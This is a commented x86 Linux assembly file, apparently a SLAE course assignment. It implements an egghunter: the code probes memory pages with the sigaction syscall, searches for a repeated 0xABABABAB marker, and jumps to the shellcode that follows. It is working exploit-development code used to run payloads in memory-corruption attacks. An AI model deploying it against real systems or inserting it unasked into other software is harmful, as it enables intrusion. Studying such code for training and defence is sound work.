; File: egghunter.nasm
; SLAE assignment 3

; REG needed: 
; 		eax : system call 
;		ecx : address iterator
; 		edi : scasd instruction for comparison of 4 byte string/egg instructions 


; EGG: "\xAB\xAB\xAB\xAB"
;      "\xAB\xAB\xAB\xAB"

; SYSCALL needed:
; 		0x43 sigaction syscall #67
; 		when executed, the syscall will try and access space pointed by *action
; 		and will return error 0xf2 for EFAULT if address memory page is not accessible 


; OBJECTIVE: 
; 		1. To iterate through every accessible memory page of the program to find the egg(shellcode)
; 		2. To transfer control to the shellcode after egg is found


global _start

section .text
_start:

page_align:
	or cx, 0x0FFF			; 0x0FFF is 4095, this is for page alignment
					; this instruction will flip all bits to 1 in the lower 16 bits of any value
					; making the value a mulitple of 4095 (fullpage = 4096 in x86 arch)
next_address:
	inc ecx				; this will make ecx mulitple of 4096, so we can examine the first address of this page
					; this will cause overflow and back to 0000000000000001 after full cycle of iteration
					; in case the egg is within 0- 4096 bytes of memory
	xor eax, eax			; zeroing out eax
	mov al, 0x43			; syscall sigaction
	int 0x80			; invoking sigaction
	cmp al, 0xf2			; comparing for EFAULT
	jz page_align			; if EFAULT returns, realign for next page of memory

	mov eax, 0xabababab		; moving the egg label to eax, getting ready for comparison
	mov edi, ecx			; current address to be compared with
	scasd				; scans edi and compare to eax, and increments edi by dword every scan

	jnz next_address		; loops to next_address if not found

	scasd				; if found, lets check for the second egg label to ensure 

	jnz next_address		; loops to next_address if insurance (second) label did not match

	jmp edi				; egg found, jmp to edi. NOTE: edi had been incremented by dword every scasd instruction



























	
